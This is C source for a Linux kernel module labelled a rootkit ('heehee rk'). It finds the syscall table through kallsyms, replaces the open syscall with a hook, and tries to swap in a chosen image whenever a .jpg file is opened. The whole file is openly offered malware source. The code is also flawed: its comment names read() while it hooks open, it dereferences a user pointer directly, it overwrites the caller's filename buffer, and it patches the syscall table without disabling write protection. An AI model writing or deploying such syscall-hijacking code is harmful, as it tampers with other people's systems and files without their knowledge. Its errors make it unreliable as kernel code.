/*
 * main.c, a kernel module that prints hee hee everytime read() is used.
 */
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/kallsyms.h>

static char *pict = NULL;

module_param(pict, charp, 0000);
MODULE_PARM_DESC(pict, "/home/fieash/Desktop/heehee/heehee.jpg");

static void **sys_call_table = NULL;

static asmlinkage long (*old_open) (const char __user *filename, int flags, umode_t mode);
static asmlinkage long hee_open(const char __user *filename, int flags, umode_t mode);

static asmlinkage long hee_open(const char __user *filename, int flags, umode_t mode)
{
    size_t len = strlen(filename);
    const char *ext = filename + len - 4;
    if (strncmp(ext, ".jpg",4 )== 0 && pict != NULL)
    {
        copy_to_user((void *)filename, pict, len);
    }
    printk(KERN_INFO "hee open triggered\n");
    pr_info("Hee open prinfo\n");
    return old_open(filename, flags, mode);
}

static int __init main_init(void)
{
    printk(KERN_INFO "==== start heehee.\n");
    
    if (pict == NULL)
    {
        pr_info("heehee module not loaded");
        return -1;
    }
    sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
    pr_info("found sys_call_table at %p\n", sys_call_table);
    old_open = sys_call_table[__NR_open];
    sys_call_table[__NR_open] = hee_open;
    pr_info("old open: %p; hee open: %p\n", old_open, hee_open);
    return 0;
}

static void __exit main_exit(void)
{
    printk(KERN_INFO "==== exit heehee.\n");
    sys_call_table[__NR_open] = old_open;
}



MODULE_LICENSE("GPL");
MODULE_AUTHOR("WYZ");
MODULE_DESCRIPTION("heehee rk");

module_init(main_init);
module_exit(main_exit);